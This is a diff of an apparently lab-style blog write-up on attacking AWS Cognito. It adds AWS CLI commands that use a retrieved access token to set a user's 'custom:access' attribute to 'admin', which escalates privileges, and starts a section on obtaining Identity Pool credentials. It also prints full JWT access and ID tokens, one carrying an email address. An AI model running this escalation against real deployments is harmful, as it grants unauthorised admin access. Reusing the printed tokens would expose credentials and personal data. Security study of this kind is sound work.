@@ -124,7 +124,8 @@ aws cognito-idp confirm-sign-up --region [region] --client-id [ClientId] --usern
 ![image](https://github.com/reveng007/blog/assets/61424547/54d14ac6-f971-4e21-a6fd-d8eb888fc20a)
 
 ```bash
-accessToken : eyJraWQiOiJGZzVTQWdsclBCczVxcEVLamhnVUhoTVdETGRzUXhQVzZSMzIyZG9pS2V3PSIsImFsZyI6IlJTMjU2In0.eyJzdWIiOiIzMDcyZjM4NS05NGZiLTRlZmYtODM3MS04MjlmNzYxMGFmN2UiLCJpc3MiOiJodHRwczpcL1wvY29nbml0by1pZHAudXMtZWFzdC0xLmFtYXpvbmF3cy5jb21cL3VzLWVhc3QtMV9tWWFWeGh3cjciLCJjbGllbnRfaWQiOiI0dTRpMTFwbWtuZmEyazZmbHJ1cjZjM2E1diIsIm9yaWdpbl9qdGkiOiJhYWM3NjA0Mi02YmRmLTRiODYtYmEzMy01ZjE1NWIyNDkzMzUiLCJldmVudF9pZCI6IjUyOGY0NWIxLTg3MGQtNGVmNC1hOWY2LTEwNWQ0MDIzNmU2NCIsInRva2VuX3VzZSI6ImFjY2VzcyIsInNjb3BlIjoiYXdzLmNvZ25pdG8uc2lnbmluLnVzZXIuYWRtaW4iLCJhdXRoX3RpbWUiOjE3MDY2MDQwOTIsImV4cCI6MTcwNjYwNzY5MiwiaWF0IjoxNzA2NjA0MDkyLCJqdGkiOiIwMTk3ZjhhZC0wZjY3LTQwZjAtOWQ5Ny0wYTAxNGQ3OTZiYjIiLCJ1c2VybmFtZSI6IjMwNzJmMzg1LTk0ZmItNGVmZi04MzcxLTgyOWY3NjEwYWY3ZSJ9.ihfBEzP-VfdOJsk_wYyi99-SRH0ymo0l2dSmUkEsa6sgQFlEfxj6D4n5LAeBLEGJLoBn5Z_lnvh5uS84LZf6kXiocjxtdC6pALBJFyZRq6tDNUbN_WfrWkSuEbYV1wsDzIehbWU5dCrNAAC8__0wawbJZZF-KpRk5msZPwN2oiYbEsWb2SQE4Pw8gWhjbYblhl0VxpN0kjA_2nmi4CbXFmTci67AHVH7MJDX79Sx1zIQPwPLRUGbE58Yunjo71lpw1ud3QqFSA1BsTz2wly5oSr6RiHEeX1lxepqRJ5Kt9xC60uF7zGQBlCWdegFf3mOm-Ugbu1tQ2khEawm9g1nTw
+accessToken :
+eyJraWQiOiJGZzVTQWdsclBCczVxcEVLamhnVUhoTVdETGRzUXhQVzZSMzIyZG9pS2V3PSIsImFsZyI6IlJTMjU2In0.eyJzdWIiOiIzMDcyZjM4NS05NGZiLTRlZmYtODM3MS04MjlmNzYxMGFmN2UiLCJpc3MiOiJodHRwczpcL1wvY29nbml0by1pZHAudXMtZWFzdC0xLmFtYXpvbmF3cy5jb21cL3VzLWVhc3QtMV9tWWFWeGh3cjciLCJjbGllbnRfaWQiOiI0dTRpMTFwbWtuZmEyazZmbHJ1cjZjM2E1diIsIm9yaWdpbl9qdGkiOiIyYzIxZDM3OS0wN2M2LTQ3YjUtYTRhZC02ZjJjZTZjM2RlMzEiLCJldmVudF9pZCI6ImVlNjFmOGI3LTI2NTAtNDgyZS05ZDJiLWFhMTlhNTk2YTFiZCIsInRva2VuX3VzZSI6ImFjY2VzcyIsInNjb3BlIjoiYXdzLmNvZ25pdG8uc2lnbmluLnVzZXIuYWRtaW4iLCJhdXRoX3RpbWUiOjE3MDY2MDU1MjgsImV4cCI6MTcwNjY2NjcxNSwiaWF0IjoxNzA2NjYzMTE1LCJqdGkiOiI1OTU4M2NjNC00YThmLTQ0NjYtODE0MS00YmE5ZGJlZjMwNTYiLCJ1c2VybmFtZSI6IjMwNzJmMzg1LTk0ZmItNGVmZi04MzcxLTgyOWY3NjEwYWY3ZSJ9.lzhDLHO9VjNCm_hqxc_VPQEXIZEK9GB5tlf3gS_PQaE_cKRFZot-vS1fFSsd3LWGYJG70ojjHj1N8HLHvMFWO94OCP6czBK-3BAq3zTA3bZ9PNTPITt34iefngx03CK6xSR6omTS3AmAStAnchSpOw457MK7mBgS5f-IWNAfLQW0hb4MkXE6LfVeCfzfG4Ur_rfWIm8j6kIVnvtSDzIj894e262BXvVI83xCEqSqgr2Svptc2Td2GN5pNX4FTaYgF0tBFtFA8AiRu6Sf2Jehh8QUC-_ZMoM4-piqk6WqOSJGlNrzHuLpn_tbf0YZgaskYmKIkAseXYiz5tN13Ywq5g
 
 idToken : 
 eyJraWQiOiI3N2JsaEwrYjBwaTNYSzlOVG9UQUFxeGdObVZMUmxFRVBjRVRIbUMzQUpnPSIsImFsZyI6IlJTMjU2In0.eyJzdWIiOiIzMDcyZjM4NS05NGZiLTRlZmYtODM3MS04MjlmNzYxMGFmN2UiLCJlbWFpbF92ZXJpZmllZCI6dHJ1ZSwiaXNzIjoiaHR0cHM6XC9cL2NvZ25pdG8taWRwLnVzLWVhc3QtMS5hbWF6b25hd3MuY29tXC91cy1lYXN0LTFfbVlhVnhod3I3IiwiY29nbml0bzp1c2VybmFtZSI6IjMwNzJmMzg1LTk0ZmItNGVmZi04MzcxLTgyOWY3NjEwYWY3ZSIsImdpdmVuX25hbWUiOiJsb3JlbSIsImN1c3RvbTphY2Nlc3MiOiJyZWFkZXIiLCJvcmlnaW5fanRpIjoiYWFjNzYwNDItNmJkZi00Yjg2LWJhMzMtNWYxNTViMjQ5MzM1IiwiYXVkIjoiNHU0aTExcG1rbmZhMms2ZmxydXI2YzNhNXYiLCJldmVudF9pZCI6IjUyOGY0NWIxLTg3MGQtNGVmNC1hOWY2LTEwNWQ0MDIzNmU2NCIsInRva2VuX3VzZSI6ImlkIiwiYXV0aF90aW1lIjoxNzA2NjA0MDkyLCJleHAiOjE3MDY2MDc2OTIsImlhdCI6MTcwNjYwNDA5MiwiZmFtaWx5X25hbWUiOiJpcHN1bSIsImp0aSI6ImY0OTljMmFkLTk5NTQtNGJhMC05Yzg2LWVlYWJlNjRiOTVkYiIsImVtYWlsIjoieWVyaXBhbjkxMUBiaXRvZmVlLmNvbSJ9.n2qxAqrVu4ibtvi326vglqY6o-WoII_gRAANt7SbkpnBXvPRkBsypKBM_pVjIXAKoNsjBOyKrb8AC6oPpSiEHkxPfFCmfCDFD_WFQcSIxn-DONjorCZmF8nkq56cPQdI_VrQbuxZyrxOVE_nNjN393oNs2ow2lj8G8nQoorOd7uU4L3dYfk7Ip1YsZReXU-93cM6la8heRET-eS5xS_uMIXk9NQwxf5oFCyuQbK4rNJTUfF7C2IAXcS5hJs22sNseV9wDOsUAuZjnsUFj4HnYQTBpJgVUiZFNRJ71585TBTJtpW-7OAMq3N9qpSrs7MbpVVOtKBzJ1KewLemBALq1Q
@@ -138,7 +139,31 @@ LastAuthUser :
 
 #### 2. With the `accessToken`, I can perform PrivEsc: <ins>B.1. ***To Elevate our privileges***</ins>:
 
-We are now granting ourselves **Admin** rights:
+Let's check which users can actually use this retrieved `Access Token`:
+
+```bash
+aws cognito-idp get-user --access-token [AccessToken]
+```
+
+![image](https://github.com/reveng007/blog/assets/61424547/3a6ae0f5-672a-4f31-a0ec-6b39e671b082)
+
+We can see that these are all data, last one is our own signing up data. All these datas within **`UserAttributes`** parameter are added by Amazon **Cognito** using a [***post-confirmation lambda trigger***](https://docs.aws.amazon.com/cognito/latest/developerguide/user-pool-lambda-post-confirmation.html)
+
+But there is one which looks different than the rest of the members : ***custom attribute “custom:access”***
+
+- In Amazon Cognito, [custom user attributes](https://docs.aws.amazon.com/cognito/latest/developerguide/user-pool-settings-attributes.html#user-pool-settings-custom-attributes) are used for **better management of users**. 
+
+- Custom User attributes lies under the category of [**Role-based access control**](https://docs.aws.amazon.com/cognito/latest/developerguide/role-based-access-control.html).
+- Custom attributes require the `custom:` prefix to distinguish them from _standard attributes_.
+- These custom attributes are important and mostly overlooked in terms of security.
+
+#### NOTE:
+Q. What is Role-based Access control?
+> Amazon Cognito identity pools assign authenticated IAM users a set of temporary, limited-privilege credentials to access your AWS resources. The permissions for each user are controlled through [IAM roles](https://docs.aws.amazon.com/cognito/latest/developerguide/iam-roles.html) (A secure way to grant permissions to Entities/IAM Users we trust) that you create.
+
+Basically, it provides limited access to a particular AWS resource by WhiteListing selective IAM users.
+
+We are now trying to update the “**custom:access**” attribute to “admin” rights using AWS CLI:
 
 ```bash
 aws cognito-idp update-user-attributes --region [region] --access-token [AccessToken] --user-attributes '[{"Name":"custom:access","Value":"admin"}]'
@@ -152,6 +177,14 @@ Let's check this:
 
 > So, we are admin now!
 
+#### 3. Objective B.2. ***get Cognito Identity Pool credentials***:
 
+Let's check the Source again now for admin account (_admin.html_):
+
+![image](https://github.com/reveng007/blog/assets/61424547/038e4567-3a44-4600-bf9a-9880b08bfa9f)
+
+```bash
+IdentityPoolId: us-east-1:020af0e2-d0e0-46cd-9602-346d98689753
+```
 
 
